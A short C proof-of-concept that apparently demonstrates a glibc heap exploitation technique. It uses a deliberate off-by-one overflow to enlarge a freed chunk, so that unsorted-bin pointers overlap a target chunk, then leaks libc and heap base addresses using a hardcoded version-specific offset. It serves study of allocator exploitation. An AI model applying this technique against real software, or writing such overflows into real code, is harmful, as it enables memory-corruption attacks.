#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(){

	void *H = malloc(0x80);
	void *V = malloc(0x18); // vulnerable object
	void *A = malloc(0xf0); // chunk size 0x100, not fastbin
	long *T = (long*)malloc(0x10); // target
	T[0] = 0x1234567890abcdef;
	T[1] = 0xdeadbeaf;
	printf("T: %lx %lx\n", T[0], T[1]);
	free(A);
	memcpy(V, "AAAAAAAAAAAAAAAAAAAAAAAA\x21",0x19); // off-by-one, enlarge sizeof A to 0x120
	void *B = malloc(0xf0); // malloc B,split A
	free(H); // insert one more chunk into unsorted bin
	printf("T: %lx %lx\n", T[0], T[1]);
	long libc_base = T[0] - 0x3c3b78;
	long heap_base = T[1];
	printf("Base Address of Libc: %lx\n",libc_base);
	printf("Base Address of Heap: %lx\n",heap_base);
	return 0;
}
